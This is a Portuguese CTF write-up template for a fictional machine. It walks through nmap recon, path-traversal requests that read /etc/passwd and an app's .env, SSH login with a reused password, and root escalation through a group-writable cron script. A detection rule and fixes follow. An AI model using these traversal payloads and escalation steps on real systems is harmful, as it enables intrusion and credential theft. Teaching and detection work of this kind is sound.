---
title: 'Exemplo: Paperweight (máquina fictícia)'
summary: 'Template de write-up. Um download de faturas sem validação de caminho expõe o .env da aplicação; a senha reutilizada abre o SSH e um script de backup gravável pelo grupo da aplicação, executado pelo cron do root, fecha a escalada.'
lang: pt-BR
type: writeup
platform: ctf
platformLabel: 'CTF fictício (exemplo)'
difficulty: easy
os: linux
eventDate: 2026-10-04
publishedOn: 2026-11-22
example: true
attack: [T1190, T1083, T1552.001, T1078, T1021.004, T1053.003]
timeline:
  - title: Reconhecimento
    detail: 'Duas portas abertas: 22 (OpenSSH) e 80 (portal de faturas em Nginx).'
  - title: Path traversal no download de faturas
    detail: 'O parâmetro file é concatenado ao diretório de faturas sem normalização, então ../ sai do diretório.'
    attack: [T1190, T1083]
  - title: Credencial no .env
    detail: 'O .env da aplicação guarda a senha do banco, reutilizada pelo usuário de sistema svc_portal.'
    attack: [T1552.001]
  - title: Acesso por SSH
    detail: 'Login como svc_portal com a senha reutilizada.'
    attack: [T1078, T1021.004]
  - title: Escalada pelo cron
    detail: 'O cron do root executa /opt/backup/run.sh, que o grupo portal pode editar.'
    attack: [T1053.003]
detection:
  level: 2
  rule: web/path_traversal_dotdot
  telemetry:
    - 'Log de acesso do Nginx em JSON: campo request_uri com ../ ou %2e%2e%2f'
    - 'auth.log: Accepted password para svc_portal vindo de um IP que nunca logou antes'
    - 'auditd: escrita em /opt/backup/run.sh por usuário diferente de root'
  logic: |
    detection:
      traversal:
        request_uri|contains:
          - '../'
          - '..%2f'
          - '%2e%2e%2f'
      condition: traversal
  notes: 'A regra cobre só o primeiro passo. SSH e cron ficam como telemetria esperada até terem regra própria.'
---

> Conteúdo fictício. Hosts usam faixas de documentação (RFC 5737) e o domínio `.invalid`. Não descreve nenhuma máquina real.

## Reconhecimento

```bash
nmap -sC -sV -oN nmap/paperweight 192.0.2.10
```

```text
22/tcp open  ssh     OpenSSH 9.6p1
80/tcp open  http    nginx 1.24.0
|_http-title: Paperweight · Portal de faturas
```

## Path traversal no download

O portal lista faturas com links do tipo `/download?file=fatura-1042.pdf`. Trocando o nome por uma sequência `../`:

```http
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: paperweight.example.invalid
```

A resposta traz o `/etc/passwd`, com o usuário `svc_portal`. O mesmo caminho lê a configuração da aplicação:

```bash
curl -s 'http://paperweight.example.invalid/download?file=../../.env'
```

```text
DB_USER=portal
DB_PASSWORD=exemplo-ficticio-nao-e-senha
```

## Acesso e escalada

A senha do banco é a mesma do `svc_portal` no SSH. Lá dentro, o crontab do sistema mostra um backup rodando como root:

```bash
cat /etc/crontab | grep backup
ls -l /opt/backup/run.sh
```

```text
*/5 * * * * root /opt/backup/run.sh
-rwxrwxr-x 1 root portal 214 out  4 09:12 /opt/backup/run.sh
```

Como o `svc_portal` está no grupo `portal`, basta acrescentar um comando ao script e esperar o próximo ciclo do cron. Fim do exemplo: flags nunca aparecem nos posts.

## Correção

- Resolver o caminho com `realpath` e conferir se continua dentro do diretório de faturas.
- Senha exclusiva para o banco, fora do webroot.
- Script do cron com dono e grupo `root` e permissão `0700`.
